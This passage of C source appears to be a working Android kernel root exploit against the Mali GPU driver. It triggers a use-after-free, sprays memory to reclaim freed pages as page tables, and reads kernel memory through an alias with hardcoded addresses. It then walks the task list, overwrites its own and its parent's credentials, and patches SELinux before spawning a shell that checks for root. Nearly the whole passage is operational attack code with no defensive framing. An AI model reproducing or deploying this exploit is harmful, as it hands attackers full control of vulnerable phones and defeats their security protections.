    for (size_t o = 0; o < NATIVE_SIZE; o += 0x1000) (void)*(volatile uint64_t *)((char *)alias_ro + o);
    logmsg("[+] UAF armed + alias prefaulted\n");

    size_t total = CHUNKS * CHUNK_SIZE + CHUNK_SIZE;
    unsigned char *raw = mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (raw == MAP_FAILED) { logmsg("[-] chunk area: %s\n", strerror(errno)); return 0; }
    g_raw = raw; g_raw_len = total;
    uintptr_t base = ((uintptr_t)raw + CHUNK_SIZE - 1) & ~(uintptr_t)(CHUNK_SIZE - 1);
    chunk_base = (unsigned char *)base;
    logmsg("[+] chunk base=0x%lx span=%luMB\n", (unsigned long)base, (CHUNKS * CHUNK_SIZE) >> 20);

    int found = 0;
    pressure_fill();
    for (int round = 0; round < 8 && !found; round++) {
        long avail = mem_available_kb();
        if (avail > 0 && avail < 320 * 1024) { logmsg("[-] avail=%ld kB low, stop spray rounds\n", avail); break; }
        spray_chunks((size_t)round * 2048, 2048);
        logmsg("[i] spray round %d (chunks %d..%d) press=%d avail=%ldkB\n",
               round, round * 2048, round * 2048 + 2047, npress, avail);
        scan_pg = 0;  /* earlier alias pages may have become live in this round */
        found = find_candidate();
        if (!found) log_mem("  avail:");
    }
    release_pressure();
    log_mem("after spray:");
    if (!found) {
        logmsg("[-] no PTE page candidate found; alias diagnostics:\n");
        for (size_t pg = 0; pg < 8; pg++) {
            uint64_t *e = (uint64_t *)((char *)alias_ro + (pg << 12));
            int nz = 0;
            int slots_hit[4] = {-1, -1, -1, -1};
            uint64_t first[4] = {0, 0, 0, 0};
            for (int s = 0; s < 512; s++) {
                if (!e[s]) continue;
                if (nz < 4) { slots_hit[nz] = s; first[nz] = e[s]; }
                nz++;
            }
            logmsg("    pg%zu nz=%d slots: %d %d %d %d\n", pg, nz,
                   slots_hit[0], slots_hit[1], slots_hit[2], slots_hit[3]);
            for (int q = 0; q < nz && q < 4; q++)
                logmsg("        s=%d v=%016llx phys=%llx\n", slots_hit[q],
                       (unsigned long long)first[q],
                       (unsigned long long)((first[q] & 0x0000fffffffff000ULL)));
        }
    }
    return found;
}

/* Tear down a failed attempt completely and reset scanner state. */
static void disarm(void) {
    if (g_raw) { munmap(g_raw, g_raw_len); g_raw = NULL; g_raw_len = 0; }
    if (alias_ro) { munmap(alias_ro, NATIVE_SIZE); alias_ro = NULL; }
    if (g_native) { munmap(g_native, NATIVE_SIZE); g_native = NULL; }
    if (fd >= 0) { close(fd); fd = -1; }
    memset(used_pg, 0, sizeof(used_pg));
    scan_pg = 0; nslot = 0; have_cand = 0;
    memset(&cur, 0, sizeof(cur));
    chunk_base = NULL;
}

int main(void) {
    logfd = open("/data/local/tmp/mali_kroot.log", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = crash_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);

    logmsg("[*] kroot pid=%d\n", getpid());
    prctl(PR_SET_NAME, "mali-kroot", 0, 0, 0);
    {
        int f = open("/proc/meminfo", O_RDONLY);
        if (f >= 0) {
            char b[4096]; ssize_t n = read(f, b, sizeof(b) - 1); close(f);
            if (n > 0) { b[n] = 0;
                char *p = strstr(b, "MemTotal:");
                if (p) {
                    uint64_t ram = (uint64_t)strtoull(p + 9, NULL, 10) * 1024ULL;
                    uint64_t span = 0x10000000ULL;
                    while (span < ram) span <<= 1;
                    g_ramsize = span;
                }
            }
        }
        logmsg("[i] ram span=%llu bytes memstart=%llx (map [%llx,%llx))\n",
               (unsigned long long)g_ramsize, (unsigned long long)g_memstart,
               (unsigned long long)(MEMSTART), (unsigned long long)(MEMSTART + g_ramsize));
    }
    unsigned long affinity = 1;
    syscall(SYS_sched_setaffinity, 0, sizeof(affinity), &affinity);
    thrash_buf = mmap(NULL, THRASH_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (thrash_buf == MAP_FAILED) { logmsg("[-] thrash mmap: %s\n", strerror(errno)); return 1; }
    for (size_t o = 0; o < THRASH_SIZE; o += 0x1000) thrash_buf[o] = (unsigned char)(o >> 12);
    thrash();

    /* one-time resident buffer we can free later to nudge reclaim */
    pressure_buf = mmap(NULL, pressure_size, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (pressure_buf != MAP_FAILED) {
        for (size_t o = 0; o < pressure_size; o += 4096)
            *(volatile unsigned char *)(pressure_buf + o) = 1;
        logmsg("[+] pre-arm pressure buffer resident (%luMB)\n", pressure_size >> 20);
    } else {
        pressure_buf = NULL;
    }
    log_mem("after pressure:");

    /* 4 independent arming attempts; each one re-triggers the kbase free and
     * gives the chunk spray a fresh chance to reclaim the pages as PTEs. */
    int found = 0;
    for (int att = 1; att <= 4 && !found; att++) {
        logmsg("[*] attempt %d/4\n", att);
        found = arm_and_find();
        if (!found) { logmsg("[-] attempt %d: no live PTE page, re-arming\n", att); disarm(); }
    }
    if (!found) { logmsg("[-] all attempts failed\n"); goto fail; }

    uint64_t msa = 0, kvo = 0;
    if (phys_read(0xffffff8009371220ULL, &msa, 8) == 0) logmsg("[i] memstart_addr=%llx\n", (unsigned long long)msa);
    if (phys_read(0xffffff8009371230ULL, &kvo, 8) == 0) logmsg("[i] kimage_voffset=%llx\n", (unsigned long long)kvo);
    if (msa && msa != MEMSTART) { g_memstart = msa; logmsg("[i] using memstart=%llx\n", (unsigned long long)msa); }

    unsigned char page[0x1000];
    if (phys_read(INIT_TASK_VA & ~0xfffULL, page, 0x1000) < 0) { logmsg("[-] read init_task page\n"); goto fail; }
    size_t ito = INIT_TASK_VA & 0xfff;
    uint64_t it_cred = *(uint64_t *)(page + ito + T_CRED);
    uint64_t it_rc = *(uint64_t *)(page + ito + T_REAL_CRED);
    char it_comm[17]; memcpy(it_comm, page + ito + T_COMM, 16); it_comm[16] = 0;
    uint64_t t_next = *(uint64_t *)(page + ito + T_TASKS);
    uint64_t t_prev = *(uint64_t *)(page + ito + T_TASKS + 8);
    logmsg("[i] init_task comm='%s' cred=%llx real_cred=%llx tasks.next=%llx tasks.prev=%llx\n",
           it_comm, (unsigned long long)it_cred, (unsigned long long)it_rc,
           (unsigned long long)t_next, (unsigned long long)t_prev);
    if (it_cred != INIT_CRED_VA || it_rc != INIT_CRED_VA) { logmsg("[-] init_cred mismatch\n"); goto fail; }
    if ((t_prev & 0xffffff0000000000ULL) != 0xffffff0000000000ULL) { logmsg("[-] bad tasks.prev\n"); goto fail; }

    uint64_t listptr = t_prev;
    uint64_t found_task = 0, found_cred = 0, found_rc = 0;
    char myname[16] = "mali-kroot";
    int bad = 0;
    for (int i = 0; i < 400 && !found_task; i++) {
        uint64_t task_va = listptr - T_TASKS;
        if (!kva_ok(task_va)) {
            logmsg("[-] task[%d] bad va %llx, aborting walk\n", i, (unsigned long long)task_va);
            bad = 1; break;
        }
        char comm[17];
        if (read_task_comm(task_va, comm) < 0) { logmsg("[-] read comm at %llx\n", (unsigned long long)task_va); bad = 1; break; }
        if (!comm_valid(comm)) {
            logmsg("[-] task[%d] %llx bad comm, aborting walk\n", i, (unsigned long long)task_va);
            bad = 1; break;
        }
        uint64_t cr = 0, rc = 0;
        if (read_u64(task_va + T_CRED, &cr) < 0 || read_u64(task_va + T_REAL_CRED, &rc) < 0) {
            logmsg("[-] read cred at %llx\n", (unsigned long long)task_va); bad = 1; break;
        }
        if (!kva_ok(cr) || !kva_ok(rc)) {
            logmsg("[-] task[%d] bad cred ptr cr=%llx rc=%llx, aborting walk\n",
                   i, (unsigned long long)cr, (unsigned long long)rc);
            bad = 1; break;
        }
        logmsg("[i] task[%d] %llx comm='%s' cred=%llx\n", i, (unsigned long long)task_va, comm, (unsigned long long)cr);
        if (strncmp(comm, myname, 15) == 0) { found_task = task_va; found_cred = cr; found_rc = rc; break; }
        uint64_t np;
        if (read_u64(task_va + T_TASKS + 8, &np) < 0) { logmsg("[-] read prev\n"); bad = 1; break; }
        if (np == (INIT_TASK_VA + T_TASKS) || np == listptr) break;
        if (!kva_ok(np - T_TASKS)) {
            logmsg("[-] task[%d] bad next ptr %llx, aborting walk\n", i, (unsigned long long)np);
            bad = 1; break;
        }
        listptr = np;
    }
    if (bad) { logmsg("[-] task walk aborted on invalid data\n"); goto fail; }
    if (!found_task) { logmsg("[-] task not found\n"); goto fail; }
    logmsg("[+] found task %llx cred=%llx real_cred=%llx\n",
           (unsigned long long)found_task, (unsigned long long)found_cred, (unsigned long long)found_rc);

    if (patch_cred(found_cred) < 0) goto fail;
    if (found_rc && found_rc != found_cred) {
        logmsg("[i] patching real_cred too\n");
        if (patch_cred(found_rc) < 0) goto fail;
    }

    uint64_t parent = 0;
    if (read_u64(found_task + T_REAL_PARENT, &parent) == 0 && parent) {
        char pc[17];
        read_task_comm(parent, pc);
        uint64_t pcred = 0, prc = 0;
        read_u64(parent + T_CRED, &pcred);
        read_u64(parent + T_REAL_CRED, &prc);
        logmsg("[i] parent task=%llx comm='%s' cred=%llx real_cred=%llx\n",
               (unsigned long long)parent, pc, (unsigned long long)pcred, (unsigned long long)prc);
        if (pcred && pcred != found_cred) {
            if (patch_cred(pcred) < 0) logmsg("[!] parent cred patch failed (continuing)\n");
            else if (prc && prc != pcred) patch_cred(prc);
        }
    }
    patch_selinux();

    logmsg("[i] getuid=%d geteuid=%d getgid=%d\n", getuid(), geteuid(), getgid());
    logmsg("[+] releasing mappings\n");
    release_all();
    close(fd);
    logmsg("[+] spawning root shell\n");
    pid_t child = fork();
    if (child == 0) {
        execl("/system/bin/sh", "sh", "-c",
              "id; getenforce; id -u; echo ROOTPROOF_$(id -u)_$(getenforce)", NULL);
        _exit(1);
    }
    int st;
    waitpid(child, &st, 0);
    logmsg("[+] shell exited status=%d\n", st);
    return 0;
fail:
    release_all();
    if (fd >= 0) close(fd);
    return 1;
}

